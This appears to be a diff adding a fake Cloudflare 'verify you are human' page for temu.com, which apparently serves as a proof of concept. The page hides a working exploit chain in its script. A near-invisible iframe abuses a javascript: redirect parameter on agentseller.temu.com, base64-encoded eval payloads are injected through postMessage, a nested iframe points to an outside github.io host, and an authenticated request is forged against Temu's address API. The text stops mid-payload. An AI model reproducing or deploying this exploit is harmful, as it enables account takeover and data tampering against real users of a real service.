@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <title>Just a moment...</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+  <meta name="robots" content="noindex,nofollow" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      line-height: 1.15;
+      -webkit-text-size-adjust: 100%;
+      color: #313131;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh;
+    }
+
+    .main-content {
+      margin: 8rem auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+    }
+
+    @media (width <=720px) {
+      .main-content {
+        margin-top: 4rem;
+      }
+    }
+
+    .h2 {
+      font-size: 1.5rem;
+      font-weight: 500;
+      line-height: 2.25rem;
+    }
+
+    @media (width <=720px) {
+      .h2 {
+        font-size: 1.25rem;
+        line-height: 1.5rem;
+      }
+    }
+
+    #challenge-error-text {
+      background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+);
+      background-repeat: no-repeat;
+      background-size: contain;
+      padding-left: 34px;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body {
+        background-color: #222;
+        color: #d9d9d9;
+      }
+    }
+  </style>
+  <meta http-equiv="refresh" content="390" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0
+    }
+
+    html {
+      line-height: 1.15;
+      -webkit-text-size-adjust: 100%;
+      color: #313131
+    }
+
+    button,
+    html {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh
+    }
+
+    body.no-js .loading-spinner {
+      visibility: hidden
+    }
+
+    body.theme-dark {
+      background-color: #222;
+      color: #d9d9d9
+    }
+
+    body.theme-dark a {
+      color: #fff
+    }
+
+    body.theme-dark a:hover {
+      color: #ee730a;
+      text-decoration: underline
+    }
+
+    body.theme-dark .lds-ring div {
+      border-color: #999 transparent transparent
+    }
+
+    body.theme-dark .font-red {
+      color: #b20f03
+    }
+
+    body.theme-dark .ctp-button {
+      background-color: #4693ff;
+      color: #1d1d1d
+    }
+
+    body.theme-dark #challenge-success-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
+    }
+
+    body.theme-dark #challenge-error-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")
+    }
+
+    body.theme-light {
+      background-color: #fff;
+      color: #313131
+    }
+
+    body.theme-light a {
+      color: #0051c3
+    }
+
+    body.theme-light a:hover {
+      color: #ee730a;
+      text-decoration: underline
+    }
+
+    body.theme-light .lds-ring div {
+      border-color: #595959 transparent transparent
+    }
+
+    body.theme-light .font-red {
+      color: #fc574a
+    }
+
+    body.theme-light .ctp-button {
+      background-color: #003681;
+      border-color: #003681;
+      color: #fff
+    }
+
+    body.theme-light #challenge-success-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
+    }
+
+    body.theme-light #challenge-error-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")
+    }
+
+    a {
+      background-color: transparent;
+      color: #0051c3;
+      text-decoration: none;
+      transition: color .15s ease
+    }
+
+    a:hover {
+      color: #ee730a;
+      text-decoration: underline
+    }
+
+    .main-content {
+      margin: 8rem auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%
+    }
+
+    .main-content .loading-spinner {
+      height: 76.391px
+    }
+
+    .spacer {
+      margin: 2rem 0
+    }
+
+    .spacer-top {
+      margin-top: 4rem
+    }
+
+    .spacer-bottom {
+      margin-bottom: 2rem
+    }
+
+    .heading-favicon {
+      height: 2rem;
+      margin-right: .5rem;
+      width: 2rem
+    }
+
+    @media (width <=720px) {
+      .main-content {
+        margin-top: 4rem
+      }
+
+      .heading-favicon {
+        height: 1.5rem;
+        width: 1.5rem
+      }
+    }
+
+    .main-wrapper {
+      align-items: center;
+      display: flex;
+      flex: 1;
+      flex-direction: column
+    }
+
+    .font-red {
+      color: #b20f03
+    }
+
+    .h1 {
+      font-size: 2.5rem;
+      font-weight: 500;
+      line-height: 3.75rem
+    }
+
+    .h2 {
+      font-weight: 500
+    }
+
+    .core-msg,
+    .h2 {
+      font-size: 1.5rem;
+      line-height: 2.25rem
+    }
+
+    .body-text,
+    .core-msg {
+      font-weight: 400
+    }
+
+    .body-text {
+      font-size: 1rem;
+      line-height: 1.25rem
+    }
+
+    @media (width <=720px) {
+      .h1 {
+        font-size: 1.5rem;
+        line-height: 1.75rem
+      }
+
+      .h2 {
+        font-size: 1.25rem
+      }
+
+      .core-msg,
+      .h2 {
+        line-height: 1.5rem
+      }
+
+      .core-msg {
+        font-size: 1rem
+      }
+    }
+
+    #challenge-error-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");
+      padding-left: 34px
+    }
+
+    #challenge-error-text,
+    #challenge-success-text {
+      background-repeat: no-repeat;
+      background-size: contain
+    }
+
+    #challenge-success-text {
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=");
+      padding-left: 42px
+    }
+
+    .text-center {
+      text-align: center
+    }
+
+    .ctp-button {
+      background-color: #0051c3;
+      border: .063rem solid #0051c3;
+      border-radius: .313rem;
+      color: #fff;
+      cursor: pointer;
+      font-size: .875rem;
+      line-height: 1.313rem;
+      margin: 2rem 0;
+      padding: 0.625rem 1.5rem;
+      transition: all 0.15s ease;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+    }
+
+    .ctp-button:hover {
+      background-color: #e56f1a;
+      border-color: #e56f1a;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+    }
+
+    .footer {
+      font-size: .75rem;
+      line-height: 1.125rem;
+      margin: 0 auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%
+    }
+
+    .footer-inner {
+      border-top: 1px solid #d9d9d9;
+      padding-bottom: 1rem;
+      padding-top: 1rem
+    }
+
+    .clearfix:after {
+      clear: both;
+      content: "";
+      display: table
+    }
+
+    .clearfix .column {
+      float: left;
+      padding-right: 1.5rem;
+      width: 50%
+    }
+
+    .diagnostic-wrapper {
+      margin-bottom: .5rem
+    }
+
+    .footer .ray-id {
+      text-align: center
+    }
+
+    .footer .ray-id code {
+      font-family: monaco, courier, monospace
+    }
+
+    .core-msg,
+    .zone-name-title {
+      overflow-wrap: break-word
+    }
+
+    @media (width <=720px) {
+      .diagnostic-wrapper {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center
+      }
+
+      .clearfix:after {
+        clear: none;
+        content: none;
+        display: initial;
+        text-align: center
+      }
+
+      .column {
+        padding-bottom: 2rem
+      }
+
+      .clearfix .column {
+        float: none;
+        padding: 0;
+        width: auto;
+        word-break: keep-all
+      }
+
+      .zone-name-title {
+        margin-bottom: 1rem
+      }
+    }
+
+    .loading-spinner {
+      height: 76.391px
+    }
+
+    .lds-ring {
+      display: inline-block;
+      position: relative
+    }
+
+    .lds-ring,
+    .lds-ring div {
+      height: 1.875rem;
+      width: 1.875rem
+    }
+
+    .lds-ring div {
+      animation: lds-ring 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
+      border: .3rem solid transparent;
+      border-radius: 50%;
+      border-top-color: #313131;
+      box-sizing: border-box;
+      display: block;
+      position: absolute
+    }
+
+    .lds-ring div:first-child {
+      animation-delay: -.45s
+    }
+
+    .lds-ring div:nth-child(2) {
+      animation-delay: -.3s
+    }
+
+    .lds-ring div:nth-child(3) {
+      animation-delay: -.15s
+    }
+
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg)
+      }
+
+      to {
+        transform: rotate(1turn)
+      }
+    }
+
+    .rtl .heading-favicon {
+      margin-left: .5rem;
+      margin-right: 0
+    }
+
+    .rtl #challenge-success-text {
+      background-position: 100%;
+      padding-left: 0;
+      padding-right: 42px
+    }
+
+    .rtl #challenge-error-text {
+      background-position: 100%;
+      padding-left: 0;
+      padding-right: 34px
+    }
+
+    .challenge-content .loading-spinner {
+      height: 76.391px
+    }
+
+    @media (prefers-color-scheme:dark) {
+      body {
+        background-color: #222;
+        color: #d9d9d9
+      }
+
+      body a {
+        color: #fff
+      }
+
+      body a:hover {
+        color: #ee730a;
+        text-decoration: underline
+      }
+
+      body .lds-ring div {
+        border-color: #999 transparent transparent
+      }
+
+      body .font-red {
+        color: #b20f03
+      }
+
+      body .ctp-button {
+        background-color: #4693ff;
+        color: #1d1d1d
+      }
+
+      body #challenge-success-text {
+        background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")
+      }
+
+      body #challenge-error-text {
+        background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")
+      }
+    }
+
+    \n
+    /*# sourceMappingURL=to.css.map */
+  </style>
+</head>
+
+<body class="no-js">
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="zone-name-title h1">temu.com</h1>
+      <p id="LLeF5" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>
+      <button class="ctp-button" id="verify-button">Verify you are human</button>
+      <div id="spinner" class="spacer loading-spinner" style="display: none; visibility: hidden">
+        <div class="lds-ring">
+          <div></div>
+          <div></div>
+          <div></div>
+          <div></div>
+        </div>
+      </div>
+
+      <script>
+        // 1. Create the iframe
+        var iframe = document.createElement('iframe');
+
+        // Your PoC URL
+        iframe.src = 'https://agentseller.temu.com/main/authentication?redirectUrl=javascript%3A%2F%2Fagentseller.temu.com%250aeval(atob(%22ZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPXggb25lcnJvcj0ib25tZXNzYWdlPWU9PmV2YWwoZS5kYXRhKSI%2BJyk%22)).com';
+
+        // 2. Size and Basic Style
+        var width = 700;
+        var height = 360;
+
+        iframe.style.width = width + 'px';
+        iframe.style.height = height + 'px';
+        iframe.style.position = 'fixed';
+        iframe.style.zIndex = '9999';
+        iframe.style.left = '-90px';
+        iframe.style.top = '20px';
+
+        // Opacity for debugging
+        iframe.style.opacity = '0.09';
+
+        // 3. Add to body
+        document.body.appendChild(iframe);
+
+        const code = "COyPK7sRq7S6St1eL36D19ba37a770e165965157cdd03aa7e7b3d9e4fc1ae96f64b6dc8ce2f";
+
+        // =====================================================
+        // PING-PONG HELPERS — no more setTimeout guessing
+        // =====================================================
+
+        // Ping the iframe's eval handler until it responds with a pong.
+        // The iframe has: onmessage = e => eval(e.data)
+        // So we send JS code that posts a pong back to us.
+        // We keep pinging every 500ms until we get the pong.
+        function pingUntilPong(target, tag) {
+          return new Promise(function (resolve) {
+            var handler = function (e) {
+              try {
+                if (e.data && e.data.__pong === tag) {
+                  window.removeEventListener('message', handler);
+                  clearInterval(iv);
+                  console.log('[PONG] ' + tag + ' — handler is alive');
+                  resolve();
+                }
+              } catch (x) { }
+            };
+            window.addEventListener('message', handler);
+
+            var iv = setInterval(function () {
+              try {
+                target.postMessage(
+                  'try{parent.postMessage({__pong:"' + tag + '"},"*")}catch(e){}',
+                  '*'
+                );
+              } catch (e) { }
+            }, 500);
+          });
+        }
+
+        // =====================================================
+        // MAIN SEQUENCE — all steps are gated by confirmed pongs
+        // =====================================================
+        (async function () {
+
+          // STEP 0: Wait for iframe's onmessage=e=>eval(e.data) to be active
+          console.log('[*] Pinging iframe handler...');
+          await pingUntilPong(iframe.contentWindow, 'handler-ready');
+
+          // STEP 1: Open named window (must exist before the modal message)
+          window.open('', 'seller-login');
+          console.log('[+] Window "seller-login" opened');
+
+          // STEP 2: Send seller-login-modal message
+          frames[0].postMessage({
+            scene: 'seller-login-modal',
+            action: 1,
+            code: code
+          }, "*");
+          console.log('[+] seller-login-modal message sent');
+
+          // STEP 3: First injection (nested iframes)
+          iframe.contentWindow.postMessage(
+            'document.write("<img src=x onerror=eval(atob(\'Y29uc3QgZD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtkLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vYWdlbnRzZWxsZXIudGVtdS5jb20vYXBpL3NlcnZlci9fc3RtIiB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCI+PC9pZnJhbWU+Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGQpO2QucXVlcnlTZWxlY3RvcigiaWZyYW1lIikub25sb2FkPWZ1bmN0aW9uKCl7dHJ5e2NvbnN0IGY9dGhpcy5jb250ZW50V2luZG93LmRvY3VtZW50LG49Zi5jcmVhdGVFbGVtZW50KCJkaXYiKTtuLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vZGFzZHNhMGQ4czlhLmdpdGh1Yi5pby9kc2Fkc2Fkc2Fkc2FkYXNkc2Evbm9uLmh0bWwiIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48L2lmcmFtZT4nO2YuYm9keS5hcHBlbmRDaGlsZChuKX1jYXRjaChlKXtjb25zb2xlLmVycm9yKCJBY2Nlc3MgZGVuaWVkOiBDcm9zcy1vcmlnaW4gcmVzdHJpY3Rpb24iKX19Ow==\'))>")',
+            '*'
+          );
+          console.log('[+] Injection 1 sent');
+
+          // STEP 4: Re-verify handler survived the document.write
+          await pingUntilPong(iframe.contentWindow, 'post-inject1');
+
+          // STEP 5: Second injection — with ping-pong for inner window too
+          // Instead of inner setTimeout(9000), we poll until the opened
+          // window is same-origin and fully loaded before writing into it.
+          iframe.contentWindow.postMessage(
+            ` 
+           document.write(\`
+          <script>
+          hamid = window.open('', 'seller-login');
+          hamid.window.location = 'https://agentseller.temu.com/';
+          var _poll = setInterval(function() {
+            try {
+              if (hamid.document && hamid.document.readyState === 'complete') {
+                clearInterval(_poll);
+                hamid.document.write("<img src=x onerror=eval(atob('ZmV0Y2goImh0dHBzOi8vd3d3LnRlbXUuY29tL2FwaS9iZy1vcmlnZW5lcy9hZGRyZXNzL2FkZCIsIHsKICAgICJoZWFkZXJzIjogewogICAgICAiYWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAgICJhbnRpLWNvbnRlbnQiOiAiMEdWTW5UZEppRlBWRFc4ZV9ldGt0cDJneW9XajlaZzdHb3BiTHdrRkNOdTFKNHVVTzRtMXdQYlVNZUVkSWJJeGtCazgyTkR0eEFEMkpuN0lWLWMwVlFST0FoR2hVRFZmbndLczRod0tQWmlmMTl5d3JSWUdwbDlYRzhBSVlUM3RCOVRDMkpBdEdGMTVyZUFvZmFRbG43bkpNWUZTMEJKY192b0dHUDJ5UXg4UDNtR2kyUll1LVpYSmNicWxsdmZBZFJZWFRReUU5cVktT1BjLVM1SG9WZFo2bG1NWjNlTEZlV0NuYzRVSDJSUnBXLTc4bkt5ZUFiZWlDOGdYV0tFalQtMnlZeDhMcm8yaFBsVEZlZHpMZ24zcjVYQkxsakduXy01Y29BTXc5N2dYVkpzOVJNQ24wbVVqanpfS1NhQlY1M3RxZVRZSUlHY09tbVVhM2gyNGVIRm4wbW93TlFrY01GMk5qQUxxQ0dEOGhRclpfcGRGVFFtOFotNlRBOUx5Uko0ay1LM2s3ckt4MG9wbmluallQd0p6eDJIWHJzdVkzMGloRFlsZlp3bHNRUTE4MXhLVWJ2c0Y2R1MydmtxampFZ2JScHAxWVdwRW82ampMY0dxUkV4dkdzS3NHSVVpVlRQTGlvLTFoZ2JsNjQyRDNmNXQyNjNxTTFkR2RpdXJIV09VdUFlWkE0UWhsaWJGRlJ1bUdyNlpJMlVxYVROLWx1ZHJnZE5pQ1VVa3dUbi1uMi1pVU9kOVJibW5wSGZVajdnNGJBOGxDQzFaRGpuMHJsdGFuS0FVWkhvbVFRYUQzWUU5bm03d1dLZS1sTUU5MHNJOWpWcFdLalhUeWw0T3FyMHFsNEYxT1lMNHhYYUFya1lhbFF1U21TamVGQm9JNFM3WlgwaWF6WXJuWWxfYmxyMU9sTEtTZm9iUzljNEVKWGU5MTRJaU5JcXliRC00S21jWEpxVE0zMkRVT05KamliQ1hzQ1VEMTJFT283dzlPRnpiZm90dDRKcEdUS044YkI2bW1mQlJhTm9BU0o5RHk5cjlZV0d1Njc0cVVvck5hOW9qd01TX0FBQmtIQWxIWXdsb2EwSmlEb3pSYVBrSjlxOG5xdmFqUElqQ0lJUU5TYWZkNGpnQkEzZUhNX0ZVcVhjWTVXXyIsCiAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04IiwKICAgICAgInZlcmlmeWF1dGh0b2tlbiI6ICIyaE41T0VPU2U4WG0tQnFUYlo4U0JBM2JmOGEzYmY2ZTM5NjJmZGUiCiAgICB9LAogICAgImJvZHkiOiBKU09OLnN0cmluZ2lmeSh7CiAgICAgICJlbmNyeXB0ZWRfcmVxdWVzdCI6ICJ7XCJlbmNyeXB0X3NjZW5lXCI6XCJvcmlnZW5lc1wiLFwiZW5jcnlwdGVkX2NvbnRlbnRcIjpcIjdBRnFsN20wZjlrK0t3d1lubUZIaU5VSFQ4aWJIam1VV2ZycEZlaTRnbjN1UHFqK0tsL3hZTTVDcjlyY1hFcUh4WGV0Yk54dlAwOHpoUEtLamU4MGwwMEhVQ2hxbzVzQkFBQkZWRWsyZVZaUlRuZ1R2aFBrWTNMb2RoVXZCai8xQzVVUlZmYjVzdTFOdUpBeHphaFh5SEkrT1JGNW5OTzlNRVhNOWtaUVY0c215VUxuUW1RZWk1T3dReVFFMkxSQnhiZXliV0dWTnZLR2x3enZEU0VUc0N0clpLWGgzekxHaGJqUEdYcDBteHBJRHlmeXp6SllNVmFsaVFpcEU1YnR1eHpaR2cvQmRLdVdwUHd6NXBiY3JvWDVzeDIwUFltUWQrbHZjN1VrL0pad1F5dmRuQllGMG45Q29ERHdmUnRTVlBqWkQ0d3RJSktuNjZ6RDQ4WmVOem8vaDlYQlRlSVFmS1lrbFRoTE1Uc2NXOVlsM1hkUzdXaGQzZEEvOUJ5dElwbENIdVRBTTRPWDBKeFZmdlpGZ2JCZnh2cTNhYWZDS0IyR2ZqeUZCbnBZRWIvYlFzaDRCRmVhaGNMandYVDl6UWorTnlhZ0phMmRvNFUwQnlrRDl5SUJuTnlydHJObSsxaUFQMzRkR1M0dFo5eDRJLy9Sd3d0clc0ZlpxUHhEazZvTU9ZV05UZ21sWmJ2ZWx3UG8wTENpKzVOMkk5Q2MwTmpma0hGOGdleEpCWHFiZXhDbHpiQmxWc2ZhREFuUVhmNkZkOC9IQURNWmk1Ulo0K2pRdEdvV1NHMkljd09xb0lQR2xMdnVzaEhhV05VcFpmMlA3OEsva2x1UEZaQ0RrbnJKRzVpMDdvWmRLU1loMFNLVzUzSVNoRy95UlVVRHE4MVpxSlY5b0lGUkRJU1hhTHkwWmM0dnRuYnJiVkxxMkxCYXJOUXRua05wVWIyVTJUeGlNd0ZKV3gzQWNDNnczUlRRTjdqMEYvVnNoNThoS09SSE54amZJcHhZUDZxM3pORlF2ZVh6bmRsS0k2Nlcwb0ZjMGxjTnhwY01LQi8vL3diRTd0bGJ1cnpORnZRdjhpV0E5Zm4zZmhRZVpNZXo2M3BRU1pxdmdjTEFiYWlOUHF1bkEwVEJNV08rV3RMdGhBa2RRZFNvbHdFSDU0SDNGUUQ3OHZiKzl1aXcrSlVWekhydldvZXJJdFlGSG5KMHo5WU1Dc045eEFhcjZadmJsOVN5eE0vSlplR2VXenhxTWZDdnlmWCtwT3U2cDNpZWUzRlhYdjVyMHFiYmUxeEtka2Q5WGR5cjBMVVVONHJSYUJpUEU2eG9NWWppK3N3QmhsNFpUYlpqZ2pUcnRQQUNhb3JyS3AvTDdjR0h5Smpxc1I5U1dUR0xxNVYzZE45WEZ4b1hKMWVmMkNtWEh3YWtJN0huMTAySUh1NlhaT3NyMmlnb0o0NXRlUVJCNnFWbE4yL3oyelBVa3IrZ1pGSEovWElDODNFblBQTTl4QUJidWRGSUozUkJBUi9KM3cvTzF2QytSQnlaejhEM0pkL3E5MWhwYkdabjEvWnNMQ0x3MWxKZS9BU1lYUWs1cnpLWXYxY1ZCTVJPK2g1c0RxamUxUVNTdDIwUUQxd0p4SUFqektqVm1uMFZhODM0WGMxZXpGM3k2Sk9OSXF0UGJ3T0pDdGU1UmxJWFRab0lZUHJ1dURMcHphYU9TamQyT2tFbHF5OHJKVTRDRE5qZy9VeXoweHk5aHhWV0YxckJITDl2S0Z0bG82bUFXTkFxZGFpYm9vZng1b0ZLckFNT0pma21EcCtpWUJyOHR1ZDF3TzF1ZWUzUnNGRllHNVpseFV0VGFjRlFcIixcImtleV92ZXJzaW9uXCI6Mn0iCiAgICB9KSwKICAgICJyZWZlcnJlciI6ICJodHRwczovL3d3dy50ZW11LmNvbS9jcmVhdGVfYWRkcmVzcy5odG1sP2NvdW50PTEmX3hfc2Vzc25faWQ9aW41ZXlubHJkYiZyZWZlcl9wY